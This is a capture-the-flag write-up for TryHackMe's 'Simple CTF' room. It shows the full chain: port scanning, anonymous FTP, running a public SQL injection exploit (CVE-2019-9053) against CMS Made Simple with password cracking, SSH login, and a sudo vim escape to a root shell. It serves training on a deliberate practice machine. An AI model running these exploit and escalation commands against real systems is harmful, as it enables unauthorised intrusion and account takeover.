# 👨‍💻 Simple CTF — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** CTF / Linux / Web Exploitation
**Tags:** `nmap` `gobuster` `cms` `sqli` `ftp` `ssh` `vim` `gtfobins` `privilege-escalation`

---

## Overview

Simple CTF lives up to its name as an approachable entry-level room, but don't let the difficulty label make you complacent — it covers a solid range of techniques: FTP enumeration, CMS vulnerability exploitation (CVE-based SQL injection), SSH brute-forcing, and privilege escalation via Vim. It's a well-rounded room that simulates a realistic small-scale web server compromise from start to finish.

---

## Reconnaissance

### Nmap — Port Scanning

```bash
nmap -sV -sC -p- --min-rate 5000 -oN nmap_simplectf.txt <TARGET_IP>
```

**Flags explained:**
- `-sV` — Version detection
- `-sC` — Default scripts
- `-p-` — All 65535 ports
- `--min-rate 5000` — Speed up the scan
- `-oN` — Save output

**Results:**
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18
2222/tcp open  ssh     OpenSSH 7.2p2
```

Key observation: **SSH is running on port 2222**, not the default 22. Always scan all ports — missing non-standard ports is a common mistake.

---

## FTP Enumeration

### Anonymous Login

```bash
ftp <TARGET_IP>
```

```
Name: anonymous
Password: (blank)
```

```bash
ls -la
cd pub
ls
get ForMitch.txt
```

Read the file:
```bash
cat ForMitch.txt
```

**Content:**
```
Dammit man... you'te the worst dev i've seen. You set the same password for the system user!
```

This tells us:
- A user named `mitch` exists on the system
- The password is weak (possibly reused from the CMS)

---

## Web Enumeration

### Directory Brute-Forcing

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 -o gobuster_simplectf.txt
```

**Key finding:**
```
/simple    (Status: 301)
```

Navigate to `http://<TARGET_IP>/simple` — you'll find a **CMS Made Simple** installation.

### CMS Version Identification

Scroll to the bottom of the CMS page:

```
CMS Made Simple version 2.2.8
```

---

## CMS Exploitation — SQL Injection (CVE-2019-9053)

CMS Made Simple 2.2.8 is vulnerable to **unauthenticated time-based blind SQL injection** in the News module.

### Finding the Exploit

```bash
searchsploit cms made simple 2.2.8
```

**Output:**
```
CMS Made Simple < 2.2.10 - SQL Injection  | php/webapps/46635.py
```

Copy the exploit:
```bash
searchsploit -m php/webapps/46635.py
```

### Running the Exploit

```bash
python2 46635.py -u http://<TARGET_IP>/simple --crack -w /usr/share/wordlists/rockyou.txt
```

**Flags explained:**
- `-u` — Target URL
- `--crack` — Crack the extracted hash using wordlist
- `-w` — Wordlist for cracking

**Output after running:**
```
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: secret (or similar)
```

The exploit extracts the password hash via blind SQLi and cracks it automatically. ✅

---

## Initial Access — SSH Login

```bash
ssh mitch@<TARGET_IP> -p 2222
```

**Flags explained:**
- `-p 2222` — Specify non-standard SSH port

Enter the cracked password when prompted. You're now logged in as `mitch`. ✅

---

## User Flag

```bash
ls -la
cat user.txt
```

User flag captured. ✅

### Exploring the System

Check who else is on the system:

```bash
ls /home
```

You may find another user (`sunbath` or similar) — check their home directory for any readable files.

---

## Privilege Escalation

### Checking Sudo Permissions

```bash
sudo -l
```

**Output:**
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

`mitch` can run `vim` as root with no password. This is exploitable via **GTFOBins**.

### Escaping Vim to a Root Shell

```bash
sudo vim -c ':!/bin/bash'
```

**Flags explained:**
- `-c` — Execute a Vim command on startup
- `:!` — Run an external shell command from within Vim
- `/bin/bash` — Shell to spawn

Alternatively, open vim and type from inside:

```bash
sudo vim
```

Then in vim normal mode:
```
:set shell=/bin/bash
:shell
```

You now have a root shell. ✅

---

## Root Flag

```bash
cat /root/root.txt
```

Root flag captured. ✅

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Reconnaissance | Full port scan | Nmap |
| FTP enumeration | Anonymous login | ftp client |
| Username discovery | FTP text file | Manual |
| Web enumeration | Directory brute-force | Gobuster |
| CMS identification | Version in page footer | Browser |
| Exploitation | Blind SQLi (CVE-2019-9053) | searchsploit / python |
| Initial access | SSH on port 2222 | ssh -p |
| Privilege escalation | Vim sudo escape | GTFOBins |

---

## Key Takeaways

- **Always scan all ports** (`-p-`) — SSH was on 2222, not 22; you'd miss it with a default scan
- FTP anonymous login often contains hints — a username was found here that cracked the whole chain
- `searchsploit` is powerful for finding CVE-based exploits quickly by CMS name and version
- GTFOBins documents `vim` as a privilege escalation vector when granted sudo — `:!/bin/bash` is the fastest escape
- Version numbers in CMS footers are a free intelligence gift — always scroll to the bottom of web pages

---

*Room link: https://tryhackme.com/room/simplectf*
